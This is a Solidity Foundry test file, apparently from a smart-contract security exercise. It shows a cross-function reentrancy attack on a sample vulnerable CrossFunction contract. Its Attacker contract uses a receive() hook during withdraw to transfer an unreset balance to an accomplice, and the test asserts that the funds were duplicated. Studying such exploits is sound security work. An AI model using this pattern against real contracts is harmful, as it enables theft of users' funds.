//SPDX-License_Identifier: GPL-3.0

import {CrossFunction} from "../../src/Reentrancy/CrossFunction.sol";
import {Test, console} from "lib/forge-std/src/Test.sol";

pragma solidity ^0.8.18;

contract CrossFunctionTest is Test {
    CrossFunction victim;
    Attacker attacker;
    address victim1 = makeAddr("victim1");
    address accomplice = makeAddr("accomplice");

    function setUp() public {
        victim = new CrossFunction();
        attacker = new Attacker(address(victim), accomplice);
        vm.deal(victim1, 1 ether);
        vm.deal(address(attacker), 0.1 ether);
    }

    function test_crossFunction() public {
        vm.prank(victim1);
        CrossFunction(victim).deposit{value: 0.3 ether}();
        vm.prank(address(attacker));
        attacker.attack();
        console.log(accomplice.balance);
        assert(address(attacker).balance == 0.1 ether); 
        assert(uint256(CrossFunction(victim).balances(accomplice)) == 0.1 ether); // we duplicated the amount
    }
}

contract Attacker {
    address victim;
    address accomplice;

    constructor(address _victim, address _accomplice) {
        victim = _victim;
        accomplice = _accomplice;
    }

    function attack() external {
        CrossFunction(victim).deposit{value: 0.1 ether}();
        CrossFunction(victim).withdraw(0.1 ether); //call will trigger receive
    }

    receive() external payable {
        uint256 balance = CrossFunction(victim).balances(address(this));
        CrossFunction(victim).transfer(accomplice, balance); //the accomplice will have a new balance!
    }
}
